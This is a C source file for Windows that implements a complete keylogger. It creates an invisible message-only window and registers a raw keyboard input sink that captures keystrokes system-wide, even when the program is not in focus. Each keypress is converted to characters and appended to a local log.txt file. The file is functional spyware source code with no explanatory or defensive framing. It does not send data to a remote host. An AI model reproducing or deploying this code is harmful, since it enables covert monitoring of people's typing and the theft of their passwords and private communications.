#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>
FILE *logfile;
int log_key(UINT vKey)
{
	BYTE lpKeyboard[256];
	char szKey[32];
	WORD wKey;
	char buf[32];
	unsigned int len;
	 
	// Convert virtual-key to ascii
	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
	GetKeyboardState(lpKeyboard);
     
	len = 0;
	switch(vKey)
	{
	case VK_BACK:
		len = wsprintf(buf, "[BP]");
		break;
	case VK_RETURN:
		len = 2;
		strcpy(buf, "\r\n");
		break;
	case VK_SHIFT:
		break;
	default:
		if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1)
			len = wsprintf(buf, "%c", (char)wKey);
		else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0)
			len = wsprintf(buf, "[%s]", szKey);
		break;
	}
 
	// Write buf into the log
	if(len > 0)
	{
		if(fwrite(buf, 1,len, logfile)!=len){
			fprintf(stderr, "Can not write to key to logfile.");
			return -1;
		}
		fflush(logfile);
	}
	 
	return 0;
}


 
// Window procedure of our message-only window
LRESULT CALLBACK wp(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	UINT dwSize;
	RAWINPUTDEVICE rid;
	RAWINPUT *buffer;
     
	switch(msg)
	{
	case WM_CREATE:
		// Register a raw input device to capture keyboard input
		rid.usUsagePage = 0x01;
		rid.usUsage = 0x06;
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.hwndTarget = hwnd;
	     
		if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
		{
			fprintf(stderr,"Can not register raw input device.");
			return -1;
		}
	     
		break;
	     
	case WM_INPUT:
		// request size of the raw input buffer to dwSize
		GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
				sizeof(RAWINPUTHEADER));
	 
		// allocate buffer for input data
		buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
	 
		if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
				   sizeof(RAWINPUTHEADER)))
		{
			// if this is keyboard message and WM_KEYDOWN, log the key
			if(buffer->header.dwType == RIM_TYPEKEYBOARD
			   && buffer->data.keyboard.Message == WM_KEYDOWN)
			{
				if(log_key(buffer->data.keyboard.VKey) == -1){
					DestroyWindow(hwnd);
				}
			}
		}
	 
		// free the buffer
		HeapFree(GetProcessHeap(), 0, buffer);
		break;
	     
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	     
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}
 
int main()
{
	const char string1[] = "randomstring1";
	HINSTANCE hInstance=GetModuleHandle(NULL);
	WNDCLASSEX wc;
	HWND hwnd;
	MSG msg;
 
	// register window class
	ZeroMemory(&wc,sizeof(WNDCLASSEX));
	wc.cbSize=sizeof(WNDCLASSEX);
	wc.lpfnWndProc=wp;
	wc.hInstance=hInstance;
	wc.lpszClassName=string1;
     
	if(!RegisterClassEx(&wc))
	{
		fprintf(stderr,"Can not register window class.");
		return(0);
	}
     
	// create message-only window
	hwnd = CreateWindowEx(0,string1,NULL,0,0,0,0,0,
			      HWND_MESSAGE,NULL,hInstance,NULL);
 
	if(!hwnd)
	{
		fprintf(stderr,"Can not create window.");
		return 0;
	}
	// open log.txt
	logfile=fopen("log.txt","ab");
	if(!logfile) {logfile=fopen("log.txt","wb");}
	if(!logfile){
		fprintf(stderr,"Can not create log.txt file.");
		return -1;
	}
    
	// the message loop
	while(GetMessage(&msg,NULL,0,0)>0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if(logfile){
		fclose(logfile);
	}
	return (0);
}
 
